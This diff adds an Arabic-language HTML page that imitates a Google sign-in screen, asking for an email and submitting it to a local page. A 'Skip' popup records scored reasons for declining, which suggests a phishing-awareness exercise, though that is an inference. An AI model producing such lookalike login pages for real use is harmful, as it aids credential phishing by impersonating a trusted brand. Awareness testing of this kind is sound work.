@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Account</title>
+	<style type="text/css">
+		*{
+			padding: 0;
+			margin: 0; 
+			font-family: sans-serif;
+			box-sizing: border-box;
+		}
+  html, body {
+  font-family: Arial, sans-serif;
+  background: #fff;
+  margin: 0;
+  padding: 0;
+  border: 0;
+  position: absolute;
+  height: 100%;
+  min-width: 100%;
+  font-size: 13px;
+  color: #404040;
+  direction: rtl;
+  -webkit-text-size-adjust: none;
+  }
+  .hero{
+			height: 100%;
+			width: 100%;
+			background-image: linear-gradient(rgba(0,0,0,0.4),rgba(0,0,0,0.4)),url(bg.jfif);
+			background-size: cover;
+			background-position: center;
+			position: absolute;
+		}
+  .from-box{
+			height: 450px;
+			width: 780px;
+			position: relative;
+			margin: 6% auto;
+			background:#fff;
+			padding: 5px;
+			overflow: hidden;
+		}  
+  button,
+  input[type=button],
+  input[type=submit] {
+  font-family: Arial, sans-serif;
+  font-size: 13px;
+  }
+  h2 {
+  font-size: 14px;
+  color: #262626;
+  margin: 0 0 15px;
+  font-weight: bold;
+  }
+  input[type=email]{
+  -moz-appearance: none;
+  -webkit-appearance: none;
+  appearance: none;
+  display: inline-block;
+  height: 36px;
+  padding: 0 8px;
+  margin: 0;
+  background: #fff;
+  border: 1px solid #d9d9d9;
+  border-top: 1px solid #c0c0c0;
+  -moz-box-sizing: border-box;
+  -webkit-box-sizing: border-box;
+  box-sizing: border-box;
+  -moz-border-radius: 1px;
+  -webkit-border-radius: 1px;
+  border-radius: 1px;
+  font-size: 15px;
+  color: #404040;
+  }
+  .google-header-bar {
+  height: 71px;
+  border-bottom: 1px solid #e5e5e5;
+  overflow: hidden;
+  }
+  .header .logo {
+  background-image: url(https://ssl.gstatic.com/accounts/ui/logo_1x.png);
+  background-size: 116px 38px;
+  background-repeat: no-repeat;
+  margin: 17px 0 0;
+  float: right;
+  height: 38px;
+  width: 116px;
+  }
+  .google-header-bar.centered {
+  border: 0;
+  height: 108px;
+  }
+  .google-header-bar.centered .header .logo {
+  float: none;
+  margin: 40px auto 30px;
+  display: block;
+  }
+  .banner {
+  text-align: center;
+  }
+  .card {
+  background-color: #f7f7f7;
+  padding: 20px 25px 30px;
+  margin: 0 auto 25px;
+  width: 304px;
+  -moz-border-radius: 2px;
+  -webkit-border-radius: 2px;
+  border-radius: 2px;
+  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+  }
+  .rc-button,
+  .rc-button:visited {
+  display: inline-block;
+  min-width: 46px;
+  text-align: center;
+  color: #444;
+  font-size: 14px;
+  font-weight: 700;
+  height: 36px;
+  padding: 0 8px;
+  line-height: 36px;
+  -moz-border-radius: 3px;
+  -webkit-border-radius: 3px;
+  border-radius: 3px;
+  -o-transition: all 0.218s;
+  -moz-transition: all 0.218s;
+  -webkit-transition: all 0.218s;
+  transition: all 0.218s;
+  border: 1px solid #dcdcdc;
+  -o-transition: none;
+  -moz-user-select: none;
+  -webkit-user-select: none;
+  user-select: none;
+  cursor: default;
+  }
+  .card .rc-button {
+  width: 100%;
+  padding: 0;
+  }
+  .rc-button-submit,
+  .rc-button-submit:visited {
+  border: 1px solid #3079ed;
+  color: #fff;
+  text-shadow: 0 1px rgba(0,0,0,0.1);
+  background-color: #4d90fe;
+  }
+  .rc-button-submit:hover {
+  border: 1px solid #2f5bb7;
+  color: #fff;
+  text-shadow: 0 1px rgba(0,0,0,0.3);
+  background-color: #357ae8;
+  }
+.banner h2 {
+  font-family: 'Open Sans', arial;
+  -webkit-font-smoothing: antialiased;
+  color: #555;
+  font-size: 18px;
+  font-weight: 400;
+  margin-bottom: 20px;
+  }
+  .signin-card {
+  width: 274px;
+  padding: 40px 40px;
+  }
+  .signin-card input[type=email],
+  .signin-card input[type=submit] {
+  width: 100%;
+  display: block;
+  margin-bottom: 10px;
+  z-index: 1;
+  position: relative;
+  -moz-box-sizing: border-box;
+  -webkit-box-sizing: border-box;
+  box-sizing: border-box;
+  }
+.circle-mask {
+  display: block;
+  height: 96px;
+  width: 96px;
+  overflow: hidden;
+  border-radius: 50%;
+  margin-left: auto;
+  margin-right: auto;
+  z-index: 100;
+  margin-bottom: 10px;
+}
+/* Button used to open the contact form - fixed at the bottom of the page */
+.open-button {
+  color: white;
+  padding: 16px 20px;
+  border: none;
+  position: fixed;
+  bottom: 160px;
+  right: 340px;
+  width: 170px;
+  background: linear-gradient(to right, #00004d, #9999ff);
+  border-radius: 30px;
+  transition: .5s;
+}
+
+/* The popup form - hidden by default */
+.form-popup {
+  display: none;
+  position: fixed;
+  bottom: 156px;
+  right: 340px;
+  border: 3px solid #f1f1f1;
+  z-index: 9;
+}
+
+/* Add styles to the form container */
+.form-container {
+  max-width: 185px;
+  padding: 10px;
+  background-color: white;
+  direction: rtl;
+}
+/* Set a style for the submit/login button */
+.form-container .btn {
+  color: white;
+  padding: 16px 20px;
+  border: none;
+  cursor: pointer;
+  width: 100%;
+  margin-bottom:10px;
+  opacity: 0.8;
+  background: linear-gradient(to right, #00004d, #9999ff);
+  border-radius: 30px;
+  transition: .5s;
+}
+
+	</style>
+</head>
+<body>
+		<div class="hero">
+			<div class="from-box">
+				<div class="wrapper">
+  <div  class="google-header-bar  centered">
+  <div class="header content clearfix">
+    <div class="logo logo-w" aria-label="Google"></div>
+  </div>
+  </div>
+ 
+<div class="banner">
+  <h2> تسجل الدخول بحساب جوجل</h2>
+</div>
+<form action="emailTest.html">
+<div  class="card signin-card pre-shift no-name">
+  <div class="form-panel first valid" id="gaia_firstform">
+   <div  class="slide-out ">
+    <div id="identifier-shown">
+      <img  class="circle-mask" src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png">
+      <input  id="Email" type="email" value="" spellcheck="false" required="required" name="Email" placeholder="البريد الإلكتروني أو الهاتف"  autofocus>
+      <button type="submit" id="next" class="rc-button rc-button-submit">التالي</button>
+    </div>
+   </div>
+  </div>
+</div>
+</form>
+		</div>
+		</div>
+	<button class="open-button" onclick="openForm()">Skip</button>
+<div class="form-popup" id="myForm">
+  <form action="emailTest.html" class="form-container">
+    <h3>لماذا تريد تخطي هذه الصفحة ؟!</h3><br>
+    <input type="radio" id="choise1" name="choise" value="70" required="required">
+    <label >لا أريد نشر بياناتي على هذا الموقع</label><br><br>
+    <input type="radio" id="choise1" name="choise" value="50" required="required">
+    <label >أرى أنه غير ضروري استخدام حساب الجوجل </label><br><br>
+    <input type="radio" id="other" name="choise" value="0" required="required">
+    <label >لا أثق بهذه الصفحة </label><br><br>
+    <button type="submit" class="btn">OK</button>
+    <button type="button" class="btn cancel" onclick="closeForm()">Close</button>
+  </form>
+</div>
+
+	<script>
+function openForm() {
+  document.getElementById("myForm").style.display = "block";
+}
+
+function closeForm() {
+  document.getElementById("myForm").style.display = "none";
+}
+</script>
+</body>
+</html>
